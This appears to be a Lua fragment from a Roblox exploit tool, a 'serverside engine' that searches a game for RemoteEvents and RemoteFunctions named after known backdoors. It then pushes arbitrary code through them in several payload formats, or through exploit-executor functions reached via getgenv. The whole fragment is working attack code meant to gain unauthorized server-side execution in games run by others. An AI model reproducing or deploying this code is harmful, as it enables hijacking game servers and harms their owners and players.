-- GLOBAL SERVERSIDE ENGINE
--==================================================================
local SS = {
    enabled = false,
    activeBackdoor = nil,
    activePayloadShape = nil,
    lastScan = 0,
}

local BACKDOOR_NAMES = {
    "remote", "mainevent", "backdoor", "backd00r", "ss",
    "serverside", "serverevent", "serverscript",
    "kohl", "kohladmin", "c00lkidd", "c00lkid",
    "lalol", "lalolhub", "anti", "ping", "checkping",
    "dataevent", "mainremote", "mainserver", "command",
    "cmds", "adminremote", "adminevent", "execute", "exec",
    "loader", "loadstring", "run", "fire",
}

local PAYLOAD_SHAPES = {
    function(code) return {"loadstring", code} end,
    function(code) return {"require", code} end,
    function(code) return {"exec", code} end,
    function(code) return {"execute", code} end,
    function(code) return {"run", code} end,
    function(code) return {code} end,
    function(code) return {"script", code} end,
}

local function tryExecutorSS(code)
    local genv = rawget(_G, "getgenv")
    local env = type(genv) == "function" and genv() or _G
    for _, n in ipairs({"ssExecute", "SSExecute", "ServerExecute", "ss_exec", "execSS"}) do
        if type(env[n]) == "function" then
            local ok = pcall(env[n], code)
            if ok then return true, n end
        end
    end
    return false
end

local function findBackdoor()
    if SS.activeBackdoor and SS.activeBackdoor.Parent then return SS.activeBackdoor end
    SS.activeBackdoor = nil
    for _, obj in ipairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local lower = string.lower(obj.Name)
            for _, n in ipairs(BACKDOOR_NAMES) do
                if lower == n or string.find(lower, n, 1, true) then
                    SS.activeBackdoor = obj
                    return obj
                end
            end
        end
    end
    return nil
end

local function ssExecute(code)
    if not SS.enabled then return false, "SS mode off" end
    local ok, name = tryExecutorSS(code)
    if ok then return true, "via executor ("..tostring(name)..")" end
    local rem = findBackdoor()
    if not rem then return false, "No backdoor remote found" end
    for i, shape in ipairs(PAYLOAD_SHAPES) do
        local args = shape(code)
        local fired
        if rem:IsA("RemoteEvent") then
            fired = pcall(function() rem:FireServer(unpack(args)) end)
        else
            fired = pcall(function() rem:InvokeServer(unpack(args)) end)
        end
        if fired then
            SS.activePayloadShape = i
            return true, "via "..rem:GetFullName().." (shape "..i..")"
        end
    end
    return false, "Backdoor found but payload rejected"
end

local function runAction(clientFn, serverCode)
    pcall(clientFn)
    if SS.enabled and serverCode then
        task.spawn(function()
            local ok, err = ssExecute(serverCode)
            if ok then notif("✓ SS: "..tostring(err), 2)
            else notif("✗ SS: "..tostring(err), 3) end
        end)
    end
end

